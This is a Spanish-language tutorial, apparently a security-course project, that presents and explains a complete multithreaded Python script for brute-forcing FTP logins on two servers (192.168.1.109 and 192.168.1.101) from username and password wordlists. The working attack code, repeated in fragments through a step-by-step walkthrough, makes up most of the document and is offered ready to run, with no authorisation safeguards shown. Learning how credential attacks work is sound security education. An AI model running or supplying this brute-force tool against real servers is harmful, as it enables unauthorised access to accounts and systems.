
**1. Objetivo y justificación**

El propósito central de este proyecto es **demostrar el diseño e implementación de una herramienta en Python capaz de realizar ataques de fuerza bruta de forma concurrente sobre dos servidores FTP distintos**, aprovechando mecanismos de paralelismo para optimizar tiempos y recursos. A continuación se detalla la razón de ser de cada componente:

1. **Ataque simultáneo a dos objetivos**
    
    - **Razonamiento**: En entornos de pruebas de penetración y auditoría de seguridad, a menudo es necesario evaluar múltiples hosts al mismo tiempo. Ejecutar ataques uno tras otro desperdicia tiempo y subutiliza la capacidad de procesamiento.
        
    - **Finalidad**: Mostrar cómo estructurar un script que, leyendo un mismo diccionario de credenciales, pruebe de forma paralela ambos servidores FTP (192.168.1.109 y 192.168.1.101), reduciendo drásticamente el tiempo total de ejecución.
        
2. **Paralelismo con hilos o tareas asíncronas**
    
    - **Razonamiento**: Python ofrece tanto `threading` como `asyncio` (o librerías como `concurrent.futures`) para ejecutar múltiples conexiones de red simultáneamente.
        
    - **Finalidad**: Enseñar a coordinar hilos/tareas que lancen intentos de login a cada servidor, gestionen sus propias colas de trabajo y reporten resultados de forma independiente.
        
3. **Lectura unificada de credenciales**
    
    - **Razonamiento**: Centralizar la lista de usuarios y contraseñas en archivos externos permite que el mismo conjunto de pruebas se aplique sin duplicar código sobre ambos targets.
        
    - **Finalidad**: Facilitar la escalabilidad y el mantenimiento; si se actualizan las listas, la herramienta automáticamente las utiliza en ambos frentes de ataque.
        
4. **Manejo concurrente de excepciones y cierres**
    
    - **Razonamiento**: Cada conexión FTP puede fallar por distintos motivos (rechazo de login, timeouts, desconexiones). En un entorno concurrente es crítico aislar excepciones por hilo/tarea para que un fallo en un servidor no derive en el colapso de toda la herramienta.
        
    - **Finalidad**: Garantizar que cada worker limpie correctamente su sesión (`ftp.quit()`) y continúe procesando su cola hasta agotarla o hasta hallar credenciales válidas.
        
5. **Detección temprana y reporte de éxito**
    
    - **Razonamiento**: Cuando un worker descubre una combinación válida en cualquiera de los dos servidores, es deseable notificarlo de inmediato y, opcionalmente, cancelar las restantes tareas para ahorrar recursos.
        
    - **Finalidad**: Implementar mecanismos de señalización (p. ej. variables compartidas o eventos) que permitan propagar el “¡éxito!” al resto de hilos/tareas y culminar la ejecución global.
        
6. **Configuración paramétrica de targets**
    
    - **Razonamiento**: Al parametrizar la lista de servidores FTP en variables o un fichero de configuración, la misma herramienta puede adaptarse fácilmente a más de dos hosts en el futuro.
        
    - **Finalidad**: Demostrar buenas prácticas de diseño: separa lógica de credenciales, configuración de targets y motor de concurrencia, para maximizar reuso y flexibilidad.
        
7. **Visualización de resultados y métricas de rendimiento**
    
    - **Razonamiento**: Más allá de ver en consola “fallo” o “éxito”, es útil medir cuántos intentos por segundo se alcanzaron, tiempo total de ejecución y eficacia de la concurrencia.
        
    - **Finalidad**: Incluir registro de tiempos de inicio/fin, contadores de intentos por servidor y, si se desea, reportes al finalizar (por ejemplo, un resumen CSV o un gráfico).
        

---

Te voy a guiar paso a paso por cómo lo construí el codigo para que quede claro cómo llegué a cada decisión.

---

### **Mi Código Mejorado y Explicado**

Voy a escribir un programa en Python que realice un ataque de fuerza bruta contra dos servidores FTP al mismo tiempo, usando hilos para que sea más rápido. Quiero que sea eficiente, fácil de leer y que la salida en la consola no se vuelva un desastre. Aquí está el código completo, y luego te explico cómo lo hice:

```python
from ftplib import FTP
import threading

# Defino una función para atacar un servidor FTP
def ataque_ftp(ftp_server, usernames, passwords):
    """
    Intenta conectar a un servidor FTP probando combinaciones de usuarios y contraseñas.
    
    :param ftp_server: IP del servidor FTP
    :param usernames: Lista de nombres de usuario
    :param passwords: Lista de contraseñas
    """
    for username in usernames:
        for password in passwords:
            try:
                # Me conecto al servidor FTP con la combinación actual
                ftp = FTP(ftp_server)
                ftp.login(user=username, passwd=password)
                # Si funciona, muestro el éxito y termino
                with print_lock:
                    print(f"¡Éxito! Con usuario: {username} y contraseña: {password} en {ftp_server}")
                ftp.quit()
                return  # Salgo porque ya encontré una combinación válida
            except Exception:
                # Si falla, lo notifico y sigo intentando
                with print_lock:
                    print(f"Fallo con usuario: {username} y contraseña: {password} en {ftp_server}")
                try:
                    ftp.quit()  # Cierro la conexión si es posible
                except:
                    pass  # Si no se puede cerrar, no pasa nada
    # Si llegué aquí, no encontré nada
    with print_lock:
        print(f"Ataque terminado en {ftp_server}. No encontré credenciales válidas.")

# Leo los usuarios y contraseñas de los archivos
with open('usuarios.txt', 'r') as uf:
    usernames = uf.read().splitlines()
with open('contraseñas.txt', 'r') as pf:
    passwords = pf.read().splitlines()

# Creo un lock para que la salida no se mezcle
print_lock = threading.Lock()

# Creo hilos para atacar dos servidores distintos
hilo1 = threading.Thread(target=ataque_ftp, args=('192.168.1.109', usernames, passwords))
hilo2 = threading.Thread(target=ataque_ftp, args=('192.168.1.101', usernames, passwords))

# Inicio los hilos
hilo1.start()
hilo2.start()

# Espero a que terminen
hilo1.join()
hilo2.join()
```

---

### **Cómo lo Construí Paso a Paso**

#### **1. Empezando con las Librerías**

Primero pensé: "Necesito conectarme a servidores FTP, así que voy a usar `ftplib` porque tiene una clase `FTP` que hace eso fácil". Luego me dije: "Quiero que los ataques a los dos servidores corran al mismo tiempo, así que voy a usar hilos con `threading`". Por eso importé:

```python
from ftplib import FTP
import threading
```

#### **2. Creando la Función Principal**

Decidí hacer una función que ataque un servidor FTP probando combinaciones de usuarios y contraseñas. Quise que fuera genérica para no repetir código para cada servidor. Así que pensé: "Le paso la IP del servidor, una lista de usuarios y una lista de contraseñas, y que pruebe todo". La llamé `ataque_ftp`:

```python
def ataque_ftp(ftp_server, usernames, passwords):
```

Dentro de la función, usé dos bucles `for` para probar cada usuario con cada contraseña. Me dije: "Por cada combinación, intento conectarme con `FTP` y `login`. Si funciona, muestro un mensaje y paro; si falla, sigo con la siguiente". También puse un manejo de errores porque sé que las conexiones fallidas lanzan excepciones:

```python
for username in usernames:
    for password in passwords:
        try:
            ftp = FTP(ftp_server)
            ftp.login(user=username, passwd=password)
            print(f"¡Éxito! Con usuario: {username} y contraseña: {password} en {ftp_server}")
            ftp.quit()
            return
        except Exception:
            print(f"Fallo con usuario: {username} y contraseña: {password} en {ftp_server}")
            try:
                ftp.quit()
            except:
                pass
```

Luego pensé: "Si no encuentro nada, quiero avisar al final", así que agregué un mensaje fuera de los bucles:

```python
print(f"Ataque terminado en {ftp_server}. No encontré credenciales válidas.")
```

#### **3. Leyendo los Archivos**

Necesitaba las listas de usuarios y contraseñas. Decidí leerlas de archivos porque es más práctico. Pensé: "Solo las leo una vez al inicio, no en cada hilo, para no desperdiciar tiempo". Usé `splitlines()` para que cada línea sea un elemento de la lista:

```python
with open('usuarios.txt', 'r') as uf:
    usernames = uf.read().splitlines()
with open('contraseñas.txt', 'r') as pf:
    passwords = pf.read().splitlines()
```

#### **4. Controlando la Salida con un Lock**

Como uso hilos, me preocupó que los `print` de los dos servidores se mezclaran en la consola y fuera ilegible. Pensé: "Voy a usar un `Lock` de `threading` para que solo un hilo imprima a la vez". Lo creé antes de los hilos y lo usé con `with` en cada `print`:

```python
print_lock = threading.Lock()
```

Y en la función, por ejemplo:

```python
with print_lock:
    print(f"¡Éxito! Con usuario: {username} y contraseña: {password} en {ftp_server}")
```

#### **5. Usando Hilos para los Dos Servidores**

Quería atacar dos servidores al mismo tiempo, así que creé un hilo para cada uno. Pensé: "Le paso a cada hilo la función `ataque_ftp` con la IP del servidor y las listas". Así lo hice:

```python
hilo1 = threading.Thread(target=ataque_ftp, args=('192.168.1.109', usernames, passwords))
hilo2 = threading.Thread(target=ataque_ftp, args=('192.168.1.101', usernames, passwords))
```

Luego los inicié con `start()` y usé `join()` para esperar a que terminen:

```python
hilo1.start()
hilo2.start()
hilo1.join()
hilo2.join()
```

---

### **Por Qué Me Gusta Mi Código**

- **Es Rápido**: Los hilos hacen que los ataques corran al mismo tiempo, no uno tras otro.
- **Es Limpio**: Solo tengo una función `ataque_ftp` que sirve para cualquier servidor, no repito código.
- **No Se Mezcla la Salida**: El `print_lock` mantiene los mensajes ordenados.
- **Es Seguro**: Manejo los errores para que no se caiga el programa.

---
